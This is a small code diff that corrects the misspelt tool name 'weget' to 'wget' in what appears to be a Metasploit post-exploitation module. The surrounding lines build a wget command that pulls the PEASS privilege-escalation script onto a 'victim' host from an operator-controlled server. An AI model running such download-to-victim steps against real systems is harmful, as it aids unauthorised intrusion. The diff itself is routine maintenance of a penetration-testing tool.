@@ -169,7 +169,7 @@ class MetasploitModule < Msf::Post
         curl_path = cmd_exec("command -v curl")
         if ! curl_path.include?("curl")
           cmd = "wget -q -O - \"#{url_download_peass}\""
-          wget_path = cmd_exec("command -v weget")
+          wget_path = cmd_exec("command -v wget")
           raise 'Neither curl nor wget were found in victim, unset the SRVHOST option!' unless wget_path.include?("wget")
         end
       end
